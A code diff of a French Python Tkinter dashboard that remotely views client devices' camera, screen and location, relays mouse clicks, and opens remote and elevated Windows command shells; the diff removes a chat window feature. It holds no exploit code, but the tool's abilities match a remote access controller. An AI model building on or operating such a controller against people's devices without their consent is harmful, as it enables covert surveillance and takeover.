@@ -9,7 +9,7 @@ l'autre, y compris pour l'enregistrement.
 
 Contrôle souris : quand le flux écran est actif, le client remonte la
 position de sa souris (affichée par un curseur rouge sur l'image) et un
-clic sur l'image écran est converti en coordonnées écran réelles puis
+clic sur l'image écran est converti en coordonnées screen réelles puis
 envoyé au serveur, qui le fait exécuter par le client.
 
 Enregistrement : un thread dédié par flux (VideoRecorder) écrit les images
@@ -26,10 +26,6 @@ fenêtre réaffiche le buffer courant.
 CMD Commandes ADMIN : idem, mais pour la console élevée (UAC Windows).
 La fenêtre GUI pointe vers /api/shell/admin/*. Bouton désactivé si
 l'appareil sélectionné n'est pas sous Windows.
-
-Chat : une fenêtre GUI par appareil, miroir de la conversation avec la
-console visible du client. Seul l'opérateur peut ouvrir/fermer la console
-distante via les boutons dédiés.
 """
 
 import argparse
@@ -80,9 +76,8 @@ LOG_THROTTLE_SECONDS = 5.0
 MOUSE_CURSOR_COLOR = "#ff3b30"
 MOUSE_CURSOR_RADIUS = 6
 
-# Shell / chat
+# Shell
 SHELL_OUTPUT_POLL_INTERVAL_MS = 300
-SHELL_CHAT_POLL_INTERVAL_MS = 800
 
 # --- Thème « Midnight » ---
 COLOR_BG = "#0b1020"
@@ -451,10 +446,8 @@ class CameraServerApp:
             "screen": StreamPanel("screen", "🖥  Écran"),
         }
 
-        # Fenêtres CMD/Chat, une par device_id
+        # Fenêtres CMD (user et admin), une par device_id
         self._cmd_windows: dict[str, tk.Toplevel] = {}
-        self._chat_windows: dict[str, tk.Toplevel] = {}
-        # NOUVEAU : fenêtres CMD Admin, une par device_id
         self._admin_cmd_windows: dict[str, tk.Toplevel] = {}
 
         self._build_ui()
@@ -531,7 +524,7 @@ class CameraServerApp:
         self.device_combo.pack(side="left", fill="x", expand=True, ipady=2)
         self.device_combo.bind("<<ComboboxSelected>>", self._on_device_selected)
 
-        # ---- Barre shell/chat ----
+        # ---- Barre shell ----
         shell_toolbar = tk.Frame(self.root, bg=COLOR_BG)
         shell_toolbar.pack(fill="x", padx=14, pady=(0, 8))
         tk.Label(
@@ -542,17 +535,11 @@ class CameraServerApp:
             command=self._open_cmd_window_for_selected,
         )
         self.btn_open_cmd.pack(side="left", padx=(0, 8))
-        # NOUVEAU : bouton CMD Admin, juste après le CMD distant
         self.btn_open_admin_cmd = ttk.Button(
             shell_toolbar, text="🛡  CMD Admin", style="Primary.TButton", cursor="hand2",
             command=self._open_admin_cmd_window_for_selected,
         )
-        self.btn_open_admin_cmd.pack(side="left", padx=(0, 8))
-        self.btn_open_chat = ttk.Button(
-            shell_toolbar, text="💬  Chat distant", style="Primary.TButton", cursor="hand2",
-            command=self._open_chat_window_for_selected,
-        )
-        self.btn_open_chat.pack(side="left")
+        self.btn_open_admin_cmd.pack(side="left")
 
         # ---- Zone principale ----
         sash = dict(bg=COLOR_BG, sashwidth=8, sashrelief="flat", borderwidth=0, sashpad=0, opaqueresize=True)
@@ -874,9 +861,6 @@ class CameraServerApp:
                 pass
             time.sleep(POLL_LOCATION_INTERVAL)
 
-            # Partie deux ###############
-
-        # ------------------------------------------------------------------
     def _poll_mouse_loop(self) -> None:
         """Interroge /api/mouse/latest pour dessiner le curseur sur l'image écran."""
         while True:
@@ -1067,10 +1051,9 @@ class CameraServerApp:
             self.btn_location_open["state"] = loc_state
         if self.btn_location_close is not None:
             self.btn_location_close["state"] = loc_state
-        for btn in (self.btn_open_cmd, self.btn_open_chat):
-            if btn is not None:
-                btn["state"] = state
-        # NOUVEAU : bouton CMD Admin — désactivé si le client n'est pas Windows
+        if self.btn_open_cmd is not None:
+            self.btn_open_cmd["state"] = state
+        # Bouton CMD Admin — désactivé si le client n'est pas Windows
         if self.btn_open_admin_cmd is not None:
             device = self.devices.get(self.selected_device_id) if self.selected_device_id else None
             is_windows = bool(device) and (device.get("platform") == "windows")
@@ -1420,7 +1403,7 @@ class CameraServerApp:
         self._cmd_windows.pop(device_id, None)
 
     # ------------------------------------------------------------------
-    # CMD Commandes ADMIN (fenêtre GUI par appareil) — NOUVEAU
+    # CMD Commandes ADMIN (fenêtre GUI par appareil)
     # ------------------------------------------------------------------
     def _open_admin_cmd_window_for_selected(self) -> None:
         if self.selected_device_id is None:
@@ -1556,137 +1539,6 @@ class CameraServerApp:
         self._admin_cmd_windows.pop(device_id, None)
 
     # ------------------------------------------------------------------
-    # Chat (fenêtre GUI par appareil)
-    # ------------------------------------------------------------------
-    def _open_chat_window_for_selected(self) -> None:
-        if self.selected_device_id is None:
-            self._log("Aucun appareil sélectionné")
-            return
-        self._open_chat_window(self.selected_device_id)
-
-    def _open_chat_window(self, device_id: str) -> None:
-        existing = self._chat_windows.get(device_id)
-        if existing is not None and existing.winfo_exists():
-            existing.lift()
-            existing.focus_force()
-            return
-
-        win = tk.Toplevel(self.root)
-        win.title(f"Chat — {device_id[:8]}")
-        win.geometry("500x560")
-        win.configure(bg=COLOR_BG)
-        self._chat_windows[device_id] = win
-
-        top = tk.Frame(win, bg=COLOR_BG)
-        top.pack(fill="x", padx=10, pady=(10, 0))
-        remote_state_var = tk.StringVar(value="Console distante : ● fermée")
-        tk.Label(top, textvariable=remote_state_var, bg=COLOR_BG, fg=COLOR_MUTED,
-                 font=(FONT, 9, "bold")).pack(side="left")
-
-        def open_remote():
-            try:
-                requests.post(
-                    f"{self.server_url}/api/shell/chat_window",
-                    json={"device_id": device_id, "command": "OPEN"},
-                    timeout=REQUEST_TIMEOUT,
-                )
-                self._log(f"[{device_id[:8]}] Chat : ouverture demandée")
-            except requests.RequestException as exc:
-                self._log(f"Échec : {exc}")
-
-        def close_remote():
-            try:
-                requests.post(
-                    f"{self.server_url}/api/shell/chat_window",
-                    json={"device_id": device_id, "command": "CLOSE"},
-                    timeout=REQUEST_TIMEOUT,
-                )
-                self._log(f"[{device_id[:8]}] Chat : fermeture demandée")
-            except requests.RequestException as exc:
-                self._log(f"Échec : {exc}")
-
-        ttk.Button(top, text="🌐 Ouvrir chez le client", style="Start.TButton",
-                   command=open_remote).pack(side="right", padx=(6, 0))
-        ttk.Button(top, text="✖ Fermer chez le client", style="Stop.TButton",
-                   command=close_remote).pack(side="right")
-
-        history = tk.Text(
-            win, bg=COLOR_VIDEO_BG, fg=COLOR_TEXT, font=(FONT, 10),
-            relief="flat", wrap="word", state="disabled",
-        )
-        history.pack(fill="both", expand=True, padx=10, pady=(8, 6))
-        history.tag_configure("moi", foreground=COLOR_CAMERA)
-        history.tag_configure("client", foreground=COLOR_SCREEN)
-
-        entry_frame = tk.Frame(win, bg=COLOR_BG)
-        entry_frame.pack(fill="x", padx=10, pady=(0, 10))
-        msg_var = tk.StringVar()
-        entry = ttk.Entry(entry_frame, textvariable=msg_var)
-        entry.pack(side="left", fill="x", expand=True, ipady=4)
-        entry.focus_set()
-
-        def append_history(role: str, text: str):
-            history["state"] = "normal"
-            prefix = "Auteur: " if role == "moi" else "Toi: "
-            tag = "moi" if role == "moi" else "client"
-            history.insert("end", prefix + text + "\n", tag)
-            history.see("end")
-            history["state"] = "disabled"
-
-        def send_message(event=None):
-            msg = msg_var.get().strip()
-            if not msg:
-                return
-            msg_var.set("")
-            append_history("moi", msg)
-            try:
-                requests.post(
-                    f"{self.server_url}/api/shell/chat",
-                    json={"device_id": device_id, "message": msg},
-                    timeout=REQUEST_TIMEOUT,
-                )
-            except requests.RequestException as exc:
-                append_history("client", f"[erreur réseau : {exc}]")
-
-        entry.bind("<Return>", send_message)
-        ttk.Button(entry_frame, text="Envoyer", command=send_message).pack(side="left", padx=(8, 0))
-
-        def refresh():
-            if not win.winfo_exists():
-                self._chat_windows.pop(device_id, None)
-                return
-            try:
-                st = requests.get(
-                    f"{self.server_url}/api/shell/chat_window/state",
-                    params={"device_id": device_id}, timeout=2,
-                )
-                if st.status_code == 200:
-                    data = st.json()
-                    remote_state_var.set(
-                        "Console distante : " + ("● ouverte" if data.get("window_open") else "● fermée")
-                    )
-                resp = requests.get(
-                    f"{self.server_url}/api/shell/results",
-                    params={"device_id": device_id}, timeout=2,
-                )
-                if resp.status_code == 200:
-                    for msg in resp.json().get("chat_in", []):
-                        append_history("client", msg["message"])
-            except requests.RequestException:
-                pass
-            win.after(SHELL_CHAT_POLL_INTERVAL_MS, refresh)
-
-        refresh()
-        win.protocol("WM_DELETE_WINDOW", lambda: self._close_chat_window(device_id, win))
-
-    def _close_chat_window(self, device_id: str, win: tk.Toplevel) -> None:
-        try:
-            win.destroy()
-        except Exception:
-            pass
-        self._chat_windows.pop(device_id, None)
-
-    # ------------------------------------------------------------------
     # Fermeture
     # ------------------------------------------------------------------
     def _on_close(self) -> None:
@@ -1698,7 +1550,7 @@ class CameraServerApp:
 
 
 def parse_args() -> argparse.Namespace:
-    parser = argparse.ArgumentParser(description="Dashboard de contrôle caméra / écran / shell / chat")
+    parser = argparse.ArgumentParser(description="Dashboard de contrôle caméra / écran / shell")
     parser.add_argument("--server", help="URL du serveur (ex. https://mon-serveur.com)")
     parser.add_argument("--save", action="store_true", help="mémorise --server pour les prochains lancements")
     return parser.parse_args()
